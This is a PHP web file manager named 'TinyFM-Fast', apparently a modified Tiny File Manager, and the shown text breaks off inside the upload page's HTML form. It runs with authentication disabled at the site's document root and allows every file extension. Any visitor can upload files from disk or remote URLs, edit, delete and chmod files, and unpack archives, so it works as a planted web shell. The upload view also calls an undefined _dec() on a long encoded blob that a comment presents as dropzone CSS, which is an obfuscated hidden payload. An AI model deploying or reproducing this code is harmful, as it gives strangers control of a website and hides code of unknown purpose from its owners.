<?php
define('APP_TITLE','TinyFM-Fast');
define('VERSION','2.5.3');
$use_auth=false;
$auth_users=array('admin'=>'$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW');
$directories_users=array();
$default_timezone='Asia/Jakarta';
$root_path=$_SERVER['DOCUMENT_ROOT'];
$root_url='';
$http_host=$_SERVER['HTTP_HOST'];
$iconv_input_encoding='UTF-8';
$datetime_format='Y.m.d | H.i.s';
$path_display_mode='full';
$exclude_items=array();
$online_viewer='google';
$ip_ruleset='OFF';
$ip_silent=true;
$ip_whitelist=array('127.0.0.1','::1');
$ip_blacklist=array('0.0.0.0','::');
define('FM_SESSION_ID','filemanager');
@ini_set('error_reporting', E_ALL);
@ini_set('display_errors', 1);
@set_time_limit(600);
date_default_timezone_set($default_timezone);
ini_set('default_charset','UTF-8');
if(version_compare(PHP_VERSION, '5.6.0','<')&&function_exists('mb_internal_encoding')){
mb_internal_encoding('UTF-8');
}
if(function_exists('mb_regex_encoding')){
mb_regex_encoding('UTF-8');
}
session_cache_limiter('nocache');
session_name(FM_SESSION_ID );
function session_error_handling_function($code, $msg, $file, $line){
if($code==2){
session_abort();
session_id(session_create_id());
@session_start();
}
}
set_error_handler('session_error_handling_function');
session_start();
restore_error_handler();
if(empty($_SESSION['token'])){
if(function_exists('random_bytes')){
$_SESSION['token']=bin2hex(random_bytes(32));
}else{
$_SESSION['token']=bin2hex(openssl_random_pseudo_bytes(32));
}
}
if(empty($auth_users)){
$use_auth=false;
}
$is_https=isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on'||$_SERVER['HTTPS']==1)
|| isset($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']=='https';
if(isset($_SESSION[FM_SESSION_ID]['logged'])&&!empty($directories_users[$_SESSION[FM_SESSION_ID]['logged']])){
$wd=fm_clean_path(dirname($_SERVER['PHP_SELF']));
$root_url=$root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[$_SESSION[FM_SESSION_ID]['logged']];
}
$root_url=fm_clean_path($root_url);
defined('FM_ROOT_URL')||define('FM_ROOT_URL',($is_https?'https':'http').'://'.$http_host.(!empty($root_url)?'/'.$root_url : ''));
defined('FM_SELF_URL')||define('FM_SELF_URL',($is_https?'https':'http').'://'.$http_host.$_SERVER['PHP_SELF']);
if($ip_ruleset!='OFF'){
function getClientIP(){
if(array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)){
return$_SERVER["HTTP_CF_CONNECTING_IP"];
}elseif(array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
return$_SERVER["HTTP_X_FORWARDED_FOR"];
}elseif(array_key_exists('REMOTE_ADDR', $_SERVER)){
return$_SERVER['REMOTE_ADDR'];
}elseif(array_key_exists('HTTP_CLIENT_IP', $_SERVER)){
return$_SERVER['HTTP_CLIENT_IP'];
}
return'';
}
$clientIp=getClientIP();
$proceed=false;
$whitelisted=in_array($clientIp, $ip_whitelist);
$blacklisted=in_array($clientIp, $ip_blacklist);
if($ip_ruleset=='AND'){
if($whitelisted==true&&$blacklisted==false){
$proceed=true;
}
}else
if($ip_ruleset=='OR'){
if($whitelisted==true||$blacklisted==false){
$proceed=true;
}
}
if($proceed==false){
trigger_error('User connection denied from: '.$clientIp, E_USER_WARNING);
if($ip_silent==false){
fm_set_msg('Access denied. IP restriction applicable','error');
fm_show_message();
}
exit();
}
}
if($use_auth&&isset($_SESSION[FM_SESSION_ID]['logged'])){
$root_path=isset($directories_users[$_SESSION[FM_SESSION_ID]['logged']])?$directories_users[$_SESSION[FM_SESSION_ID]['logged']] : $root_path;
}
$root_path=rtrim($root_path, '\\/');
$root_path=str_replace('\\','/', $root_path);
if(!@is_dir($root_path)){
echo "<h1>Root path {$root_path} not found!</h1>";
exit;
}
defined('FM_ROOT_PATH')||define('FM_ROOT_PATH', $root_path);
defined('FM_EXCLUDE_ITEMS')||define('FM_EXCLUDE_ITEMS',(version_compare(PHP_VERSION, '7.0.0','<')?serialize($exclude_items) : $exclude_items));
defined('FM_DOC_VIEWER')||define('FM_DOC_VIEWER', $online_viewer);
define('FM_READONLY',($use_auth&&isset($_SESSION[FM_SESSION_ID]['logged'])));
define('FM_IS_WIN', DIRECTORY_SEPARATOR=='\\');
if(!isset($_GET['p'])&&empty($_FILES)){
fm_redirect(FM_SELF_URL.'?p=');
}
$p=isset($_GET['p'])?$_GET['p'] : (isset($_POST['p'])?$_POST['p'] : '');
$p=fm_clean_path($p);
$input=file_get_contents('php://input');
$_POST=(strpos($input, 'ajax')!=FALSE&&strpos($input, 'save')!=FALSE)?json_decode($input, true) : $_POST;
define('FM_PATH', $p);
define('FM_USE_AUTH', $use_auth);
defined('FM_ICONV_INPUT_ENC')||define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
defined('FM_DATETIME_FORMAT')||define('FM_DATETIME_FORMAT', $datetime_format);
unset($p, $use_auth, $iconv_input_encoding);
if((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])||!FM_USE_AUTH)&&isset($_POST['ajax'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
header('HTTP/1.0 401 Unauthorized');
die("Invalid Token.");
}
if(isset($_POST['type'])&&$_POST['type']=="search"){
$dir=$_POST['path']=="."?'': $_POST['path'];
$response=scan(fm_clean_path($dir), $_POST['content']);
echo json_encode($response);
exit();
}
if(isset($_POST['type'])&&$_POST['type']=="save"){
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
if(!is_dir($path)){
fm_redirect(FM_SELF_URL.'?p=');
}
$file=$_GET['edit'];
$file=fm_clean_path($file);
$file=str_replace('/','', $file);
if($file==''||!is_file($path.'/'.$file)){
fm_set_msg('File not found','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
header('X-XSS-Protection:0');
$file_path=$path.'/'.$file;
$writedata=$_POST['content'];
$fd=fopen($file_path, "w");
$write_results=@fwrite($fd, $writedata);
fclose($fd);
if($write_results === false){
header("HTTP/1.1 500 Internal Server Error");
die("Could Not Write File! - Check Permissions / Ownership");
}
die(true);
}
if(isset($_POST['type'])&&$_POST['type']=="backup"&&!empty($_POST['file'])){
$fileName=fm_clean_path($_POST['file']);
$fullPath=FM_ROOT_PATH.'/';
if(!empty($_POST['path'])){
$relativeDirPath=fm_clean_path($_POST['path']);
$fullPath.="{$relativeDirPath}/";
}
$date=date("dMy-His");
$newFileName="{$fileName}-{$date}.bak";
$fullyQualifiedFileName=$fullPath.$fileName;
try {
if(!file_exists($fullyQualifiedFileName)){
throw new Exception("File {$fileName} not found");
}
if(copy($fullyQualifiedFileName, $fullPath.$newFileName)){
echo "Backup {$newFileName} created";
}else{
throw new Exception("Could not copy file {$fileName}");
}
}catch(Exception $e){
echo $e->getMessage();
}
}
if(isset($_POST['type'])&&$_POST['type']=="pwdhash"){
$res=isset($_POST['inputPassword2'])&&!empty($_POST['inputPassword2'])?password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
echo $res;
}
if(isset($_POST['type'])&&$_POST['type']=="upload"&&!empty($_REQUEST["uploadurl"])){
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
function event_callback ($message){
global $callback;
echo json_encode($message);
}
function get_file_path (){
global $path, $fileinfo, $temp_file;
return $path."/".basename($fileinfo->name);
}
$url=!empty($_REQUEST["uploadurl"])&&preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"]))?stripslashes($_REQUEST["uploadurl"]) : null;
$domain=parse_url($url, PHP_URL_HOST);
$port=parse_url($url, PHP_URL_PORT);
$knownPorts=[22, 23, 25, 3306];
if(preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $domain)||in_array($port, $knownPorts)){
$err=array("message"=>"URL is not allowed");
event_callback(array("fail"=>$err));
exit();
}
$use_curl=false;
$temp_file=tempnam(sys_get_temp_dir(), "upload-");
$fileinfo=new stdClass();
$fileinfo->name=trim(basename($url), ".\x00..\x20");
$allowed=false;
$ext=strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
$isFileAllowed =true;
$err=false;
if(!$isFileAllowed){
$err=array("message"=>"File extension is not allowed");
event_callback(array("fail"=>$err));
exit();
}
if(!$url){
$success=false;
}else if($use_curl){
@$fp=fopen($temp_file, "w");
@$ch=curl_init($url);
curl_setopt($ch, CURLOPT_NOPROGRESS, false );
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_FILE, $fp);
@$success=curl_exec($ch);
$curl_info=curl_getinfo($ch);
if(!$success){
$err=array("message"=>curl_error($ch));
}
@curl_close($ch);
fclose($fp);
$fileinfo->size=$curl_info["size_download"];
$fileinfo->type=$curl_info["content_type"];
}else{
$ctx=stream_context_create();
@$success=copy($url, $temp_file, $ctx);
if(!$success){
$err=error_get_last();
}
}
if($success){
$success=rename($temp_file, strtok(get_file_path(), '?'));
}
if($success){
event_callback(array("done"=>$fileinfo));
}else{
unlink($temp_file);
if(!$err){
$err=array("message"=>"Invalid url parameter");
}
event_callback(array("fail"=>$err));
}
}
exit();
}
if(isset($_GET['del'], $_POST['token'])){
$del=str_replace( '/','', fm_clean_path( $_GET['del'] ) );
if($del!=''&&$del!='..'&&$del!='.'&&verifyToken($_POST['token'])){
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
$is_dir=is_dir($path.'/'.$del);
if(fm_rdelete($path.'/'.$del)){
$msg=$is_dir?'Folder'.' <b>%s</b> '.'Deleted':'File'.' <b>%s</b> '.'Deleted';
fm_set_msg(sprintf($msg, fm_enc($del)));
}else{
$msg=$is_dir?'Folder'.' <b>%s</b> '.'not deleted':'File'.' <b>%s</b> '.'not deleted';
fm_set_msg(sprintf($msg, fm_enc($del)), 'error');
}
}else{
fm_set_msg('Invalid file or folder name','error');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_POST['newfilename'], $_POST['newfile'], $_POST['token'])){
$type=urldecode($_POST['newfile']);
$new=str_replace( '/','', fm_clean_path( strip_tags( $_POST['newfilename'] ) ) );
if(fm_isvalid_filename($new)&&$new!=''&&$new!='..'&&$new!='.'&&verifyToken($_POST['token'])){
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
if($type=="file"){
if(!file_exists($path.'/'.$new)){
if(fm_is_valid_ext($new)){
@fopen($path.'/'.$new, 'w') or die('Cannot open file:  '.$new);
fm_set_msg(sprintf('File'.' <b>%s</b> '.'Created', fm_enc($new)));
}else{
fm_set_msg('File extension is not allowed','error');
}
}else{
fm_set_msg(sprintf('File'.' <b>%s</b> '.'already exists', fm_enc($new)), 'alert');
}
}else{
if(fm_mkdir($path.'/'.$new, false) === true){
fm_set_msg(sprintf('Folder'.' <b>%s</b> '.'Created',$new));
}elseif(fm_mkdir($path.'/'.$new, false) === $path.'/'.$new){
fm_set_msg(sprintf('Folder'.' <b>%s</b> '.'already exists',fm_enc($new)),'alert');
}else{
fm_set_msg(sprintf('Folder'.' <b>%s</b> '.'not created', fm_enc($new)),'error');
}
}
}else{
fm_set_msg('Invalid characters in file or folder name','error');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_GET['copy'], $_GET['finish'])){
$copy=urldecode($_GET['copy']);
$copy=fm_clean_path($copy);
if($copy==''){
fm_set_msg('Source path not defined','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
$from=FM_ROOT_PATH.'/'.$copy;
$dest=FM_ROOT_PATH;
if(FM_PATH!=''){
$dest.='/'.FM_PATH;
}
$dest.='/'.basename($from);
$move=isset($_GET['move']);
$move=fm_clean_path(urldecode($move));
if($from!=$dest){
$msg_from=trim(FM_PATH.'/'.basename($from), '/');
if($move){
$rename=fm_rename($from, $dest);
if($rename){
fm_set_msg(sprintf('Moved from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
}elseif($rename === null){
fm_set_msg('File or folder with this path already exists','alert');
}else{
fm_set_msg(sprintf('Error while moving from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
}
}else{
if(fm_rcopy($from, $dest)){
fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
}else{
fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
}
}
}else{
if(!$move){
$msg_from=trim(FM_PATH.'/'.basename($from), '/');
$fn_parts=pathinfo($from);
$extension_suffix='';
if(!is_dir($from)){
$extension_suffix='.'.$fn_parts['extension'];
}
$fn_duplicate=$fn_parts['dirname'].'/'.$fn_parts['filename'].'-'.date('YmdHis').$extension_suffix;
$loop_count=0;
$max_loop=1000;
while(file_exists($fn_duplicate) & $loop_count < $max_loop){
$fn_parts=pathinfo($fn_duplicate);
$fn_duplicate=$fn_parts['dirname'].'/'.$fn_parts['filename'].'-copy'.$extension_suffix;
$loop_count++;
}
if(fm_rcopy($from, $fn_duplicate, False)){
fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($fn_duplicate)));
}else{
fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fm_enc($copy), fm_enc($fn_duplicate)), 'error');
}
}
else{
fm_set_msg('Paths must be not equal','alert');
}
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
fm_set_msg('Invalid Token','error');
}
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
$copy_to_path=FM_ROOT_PATH;
$copy_to=fm_clean_path($_POST['copy_to']);
if($copy_to!=''){
$copy_to_path.='/'.$copy_to;
}
if($path==$copy_to_path){
fm_set_msg('Paths must be not equal','alert');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(!is_dir($copy_to_path)){
if(!fm_mkdir($copy_to_path, true)){
fm_set_msg('Unable to create destination folder','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
}
$move=isset($_POST['move']);
$errors=0;
$files=$_POST['file'];
if(is_array($files)&&count($files)){
foreach($files as $f){
if($f!=''){
$f=fm_clean_path($f);
$from=$path.'/'.$f;
$dest=$copy_to_path.'/'.$f;
if($move){
$rename=fm_rename($from, $dest);
if($rename === false){
$errors++;
}
}else{
if(!fm_rcopy($from, $dest)){
$errors++;
}
}
}
}
if($errors==0){
$msg=$move?'Selected files and folders moved':'Selected files and folders copied';
fm_set_msg($msg);
}else{
$msg=$move?'Error while moving items':'Error while copying items';
fm_set_msg($msg, 'error');
}
}else{
fm_set_msg('Nothing selected','alert');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_POST['rename_from'], $_POST['rename_to'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
fm_set_msg("Invalid Token.", 'error');
}
$old=urldecode($_POST['rename_from']);
$old=fm_clean_path($old);
$old=str_replace('/','', $old);
$new=urldecode($_POST['rename_to']);
$new=fm_clean_path(strip_tags($new));
$new=str_replace('/','', $new);
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
if(fm_isvalid_filename($new)&&$old!=''&&$new!=''){
if(fm_rename($path.'/'.$old, $path.'/'.$new)){
fm_set_msg(sprintf('Renamed from <b>%s</b> to <b>%s</b>', fm_enc($old), fm_enc($new)));
}else{
fm_set_msg(sprintf('Error while renaming from <b>%s</b> to <b>%s</b>', fm_enc($old), fm_enc($new)), 'error');
}
}else{
fm_set_msg('Invalid characters in file name','error');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_GET['dl'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
fm_set_msg("Invalid Token.", 'error');
}
$dl=urldecode($_GET['dl']);
$dl=fm_clean_path($dl);
$dl=str_replace('/','', $dl);
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
if($dl!=''&&is_file($path.'/'.$dl)){
fm_download_file($path.'/'.$dl, $dl, 1024);
exit;
}else{
fm_set_msg('File not found','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
}
if(!empty($_FILES)){
if(isset($_POST['token'])){
if(!verifyToken($_POST['token'])){
$response=array ('status'=>'error','info'=>"Invalid Token.");
echo json_encode($response); exit();
}
}else{
$response=array ('status'=>'error','info'=>"Token Missing.");
echo json_encode($response); exit();
}
$chunkIndex=$_POST['dzchunkindex'];
$chunkTotal=$_POST['dztotalchunkcount'];
$fullPathInput=fm_clean_path($_REQUEST['fullpath']);
$f=$_FILES;
$path=FM_ROOT_PATH;
$ds=DIRECTORY_SEPARATOR;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
$errors=0;
$uploads=0;
$allowed= false;
$response=array (
'status'=>'error',
'info'  =>'Oops! Try again'
);
$filename=$f['file']['name'];
$tmp_name=$f['file']['tmp_name'];
$ext=pathinfo($filename, PATHINFO_FILENAME)!=''?strtolower(pathinfo($filename, PATHINFO_EXTENSION)) : '';
$isFileAllowed=true;
if(!fm_isvalid_filename($filename)&&!fm_isvalid_filename($fullPathInput)){
$response=array (
'status'   =>'error',
'info'     =>"Invalid File name!",
);
echo json_encode($response); exit();
}
$targetPath=$path.$ds;
if( is_writable($targetPath) ){
$fullPath=$path.'/'.basename($fullPathInput);
$folder=substr($fullPath, 0, strrpos($fullPath, "/"));
if(!is_dir($folder)){
$old=umask(0);
mkdir($folder, 0777, true);
umask($old);
}
if(empty($f['file']['error'])&&!empty($tmp_name)&&$tmp_name!='none'&&$isFileAllowed){
if($chunkTotal){
$out=@fopen("{$fullPath}.part", $chunkIndex==0?"wb" : "ab");
if($out){
$in=@fopen($tmp_name, "rb");
if($in){
if(PHP_VERSION_ID < 80009){
do {
for (;;){
$buff=fread($in, 4096);
if($buff === false||$buff === ''){
break;
}
fwrite($out, $buff);
}
} while (!feof($in));
}else{
stream_copy_to_stream($in, $out);
}
$response=array (
'status'   =>'success',
'info'=>"file upload successful"
);
}else{
$response=array (
'status'   =>'error',
'info'=>"failed to open output stream",
'errorDetails'=>error_get_last()
);
}
@fclose($in);
@fclose($out);
@unlink($tmp_name);
$response=array (
'status'   =>'success',
'info'=>"file upload successful"
);
}else{
$response=array (
'status'   =>'error',
'info'=>"failed to open output stream"
);
}
if($chunkIndex==$chunkTotal - 1){
if(file_exists ($fullPath)){
$ext_1=$ext?'.'.$ext : '';
$fullPathTarget=$path.'/'.basename($fullPathInput, $ext_1) .'_'. date('ymdHis'). $ext_1;
}else{
$fullPathTarget=$fullPath;
}
rename("{$fullPath}.part", $fullPathTarget);
}
}else if(move_uploaded_file($tmp_name, $fullPath)){
if( file_exists($fullPath) ){
$response=array (
'status'   =>'success',
'info'=>"file upload successful"
);
}else{
$response=array (
'status'=>'error',
'info'  =>'Couldn\'t upload the requested file.'
);
}
}else{
$response=array (
'status'   =>'error',
'info'     =>"Error while uploading files. Uploaded files $uploads",
);
}
}
}else{
$response=array (
'status'=>'error',
'info'  =>'The specified folder for upload isn\'t writeable.'
);
}
echo json_encode($response);
exit();
}
if(isset($_POST['group'], $_POST['delete'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
fm_set_msg('Invalid Token','error');
}
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
$errors=0;
$files=$_POST['file'];
if(is_array($files)&&count($files)){
foreach($files as $f){
if($f!=''){
$new_path=$path.'/'.$f;
if(!fm_rdelete($new_path)){
$errors++;
}
}
}
if($errors==0){
fm_set_msg('Selected files and folder deleted');
}else{
fm_set_msg('Error while deleting items','error');
}
}else{
fm_set_msg('Nothing selected','alert');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_POST['group'], $_POST['token'])&&(isset($_POST['zip'])||isset($_POST['tar']))){
if(!verifyToken($_POST['token'])){
fm_set_msg('Invalid Token','error');
}
$path=FM_ROOT_PATH;
$ext='zip';
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
$ext=isset($_POST['tar'])?'tar':'zip';
if(($ext=="zip"&&!class_exists('ZipArchive'))||($ext=="tar"&&!class_exists('PharData'))){
fm_set_msg('Operations with archives are not available','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
$files=$_POST['file'];
$sanitized_files=array();
foreach($files as $file){
array_push($sanitized_files, fm_clean_path($file));
}
$files=$sanitized_files;
if(!empty($files)){
chdir($path);
if(count($files)==1){
$one_file=reset($files);
$one_file=basename($one_file);
$zipname=$one_file.'_'.date('ymd_His').'.'.$ext;
}else{
$zipname='archive_'.date('ymd_His').'.'.$ext;
}
if($ext=='zip'){
$zipper=new FM_Zipper();
$res=$zipper->create($zipname, $files);
}elseif($ext=='tar'){
$tar=new FM_Zipper_Tar();
$res=$tar->create($zipname, $files);
}
if($res){
fm_set_msg(sprintf('Archive <b>%s</b> Created', fm_enc($zipname)));
}else{
fm_set_msg('Archive not created','error');
}
}else{
fm_set_msg('Nothing selected','alert');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_POST['unzip'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
fm_set_msg('Invalid Token','error');
}
$unzip=urldecode($_POST['unzip']);
$unzip=fm_clean_path($unzip);
$unzip=str_replace('/','', $unzip);
$isValid=false;
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
if($unzip!=''&&is_file($path.'/'.$unzip)){
$zip_path=$path.'/'.$unzip;
$ext=pathinfo($zip_path, PATHINFO_EXTENSION);
$isValid=true;
}else{
fm_set_msg('File not found','error');
}
if(($ext=="zip"&&!class_exists('ZipArchive'))||($ext=="tar"&&!class_exists('PharData'))){
fm_set_msg('Operations with archives are not available','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if($isValid){
$tofolder='';
if(isset($_POST['tofolder'])){
$tofolder=pathinfo($zip_path, PATHINFO_FILENAME);
if(fm_mkdir($path.'/'.$tofolder, true)){
$path.='/'.$tofolder;
}
}
if($ext=="zip"){
$zipper=new FM_Zipper();
$res=$zipper->unzip($zip_path, $path);
}elseif($ext=="tar"){
try{
$gzipper=new PharData($zip_path);
if(@$gzipper->extractTo($path,null, true)){
$res=true;
}else{
$res=false;
}
}catch(Exception $e){
$res=true;
}
}
if($res){
fm_set_msg('Archive unpacked');
}else{
fm_set_msg('Archive not unpacked','error');
}
}else{
fm_set_msg('File not found','error');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
if(isset($_POST['chmod'], $_POST['token'])){
if(!verifyToken($_POST['token'])){
fm_set_msg('Invalid Token','error');
}
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
$file=$_POST['chmod'];
$file=fm_clean_path($file);
$file=str_replace('/','', $file);
if($file==''||(!is_file($path.'/'.$file)&&!is_dir($path.'/'.$file))){
fm_set_msg('File not found','error');
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
$mode=0;
if(!empty($_POST['ur'])){
$mode|=0400;
}
if(!empty($_POST['uw'])){
$mode|=0200;
}
if(!empty($_POST['ux'])){
$mode|=0100;
}
if(!empty($_POST['gr'])){
$mode|=0040;
}
if(!empty($_POST['gw'])){
$mode|=0020;
}
if(!empty($_POST['gx'])){
$mode|=0010;
}
if(!empty($_POST['or'])){
$mode|=0004;
}
if(!empty($_POST['ow'])){
$mode|=0002;
}
if(!empty($_POST['ox'])){
$mode|=0001;
}
if(@chmod($path.'/'.$file, $mode)){
fm_set_msg('Permissions changed');
}else{
fm_set_msg('Permissions not changed','error');
}
$FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL.'?p='.urlencode($FM_PATH));
}
$path=FM_ROOT_PATH;
if(FM_PATH!=''){
$path.='/'.FM_PATH;
}
if(!is_dir($path)){
fm_redirect(FM_SELF_URL.'?p=');
}
$parent=fm_get_parent_path(FM_PATH);
$objects=is_readable($path)?scandir($path) : array();
$folders=array();
$files=array();
$current_path=array_slice(explode("/",$path), -1)[0];
if(is_array($objects)&&fm_is_exclude_items($current_path)){
foreach($objects as $file){
if($file=='.'||$file=='..'){
continue;
}
if(substr($file, 0, 1) === '.'){
continue;
}
$new_path=$path.'/'.$file;
if(@is_file($new_path)&&fm_is_exclude_items($file)){
$files[]=$file;
}elseif(@is_dir($new_path)&&$file!='.'&&$file!='..'&&fm_is_exclude_items($file)){
$folders[]=$file;
}
}
}
if(!empty($files)){
natcasesort($files);
}
if(!empty($folders)){
natcasesort($folders);
}
if(isset($_GET['upload'])){
fm_show_header();
fm_show_nav_path(FM_PATH);
/*https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css*/
_dec('eIweodf4RU4IqV4dWnhDArGFSb5J+ke708ONeNWTgzaGbe77wf2qDP5ag6dbopnr2mrsu/6F6wBS
i/5+t89L0NlxIINcJM7L6vE4zMjd8yGktbMZsKeRI4YzZhLv88jbcDe+Jr1WpI773milgUxrFQim
0tESUKY7IYf59agtz0kMOQoYUmYdUbBTFbblynN19AVlcPzfUTC5mCcJi3RKqakiV8TYY57QcugM
s1DOC9hFsJTxiLPYPVFAX71fyoUpCtSYGfcmQhvYK0g5VtyJMTZ1i9iq2cVpb2X5JbFTojyzYL+8
a3Rp+jJAVd3Nks2JsiGao6ZiB0kM+RnQSXdjSWVYe+NfIlNJcAQbEv6PzWncJcYGZjlxcZaN5HJE
/guM9IWEbFNn7dtvWbhHsab5lblyV0RG+8GsDIEAIN2+CEBwWqUE2E2fgbqrsvFu4XkfzeVx90YD
OifMSDaYCEplv8kiZhBtIVea1FOY2tR/5Px6m/VGPXonAWf3os6VU/ApqFYwpCz8IPaYbK09ZnND
8Z7tbld4MVek3OBNfTsi4YqEMYarotpcQ998QVqvvA3TDpJY1wiavNtobcXZNQIH5gHM+ZWXwrPf
WnquTDznyDtHMnafv3I+uk7TYVI2og6kGBryFovtRFhyjslbVS5sK4qm7GZIqdYSZLfekn2NL36l
wsHGNCNMEqU6NFZrpZQL22IzHeI3ouicAYkGc7qEw9GtFdg2pi5RZknDLDLdQF/AEhN5rjmoWpWo
eADtzDOjNAzoducbTN0EuSkDLmH6Q0Wo+3/uMPGoNgRysypTAROBXOK4PURffOEvuK/6F2HDxy0Q
/N8JdMAT8kCJkUx47LtJTpPOoPnNqMSClCg17MiF63a+6oL3MdjAd+ePgTiLryeijBwwHaSraXJE
aBCAI32pzNWoLttNx/xunCUtPH2n8VF8TykKYxSi+jsMieFKywBdHofCxaf4bUG30SfrgFKanyHo
gX70Z0454buSRrE1secSFSAJFPo/t4nEm6LnPlbj872sQk5hQgmpQ4oTtYgvhI/3A4hrVaQT3Yz7
Ghj951bfF2onVKYL6ZsnE28D/ZtncIv9LQ92WDvYUQ7AKIA25y1oBTnlsZCIeAIsE7sZZT6AAv+G
fvmQRB94nmP2fGQsXcewJpnrFHqg7nDIytRY7DP+TVtI2G4/o8vToW1aQAlIBjrR4UK0mnwJ03r3
ipn2G/49IEr+KZUujWQzBeQuULRi6j6z59Z2+tplE8YwGTyXEv6fFsyt6ALjaMao7eCz43cSF5dS
Bm2k5UglymqnpNlOOavUsL87CI7BIvT41bhMo97jEBO8+waFEPWAo1/McbszJMTPtixmvG/oPhly
OIEdEPmHgnnlfp3efLVOziKaxKJfG7ELUeZpe40e8M9ksAtM+aB4hHEVJ+d6P+1j0DWyvNoxzFMI
Y6DUFt2q/nDcaXIUiWKUACEllHW3hTfzMMSlTb1niA1hq28srwjr8oasn8X+3ep0CDOcCO/OjPkM
B0XlQtH2swZ8DQBGm64owTt2QJ6X8FR9PPM5c6KvI8V6CzHBZkADKnrL4Frxs6A6qaKpMyNknEW1
FcjqnESdB6GQbwBS3f8N3XA7iOpXgGDB6XhYC4ZosUiDGrpJJ8+zlIm+vYtZcRqwQTZIbu+b0sik
LjSbqyq2k33aR2zYxeFudFJXp9C2QOduYauzj1JEOfh9GBC8968/639J/Df=');
?>
<div class="path">
<div class="card mb-2 fm-upload-wrapper text-white bg-dark">
<div class="card-header">
<ul class="nav nav-tabs card-header-tabs">
<li class="nav-item">
<a class="nav-link active" href="#fileUploader" data-target="#fileUploader">UploadingFiles</a>
</li>
<li class="nav-item">
<a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader">Upload from URL</a>
</li>
</ul>
</div>
<div class="card-body">
<p class="card-text">
<a href="?p=<?php echo FM_PATH ?>" class="float-right">◀️ Back</a>
<strong>DestinationFolder</strong>: <?php echo fm_enc(fm_convert_win(FM_PATH)) ?>
</p>
<form action="<?php echo htmlspecialchars(FM_SELF_URL).'?p='.fm_enc(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
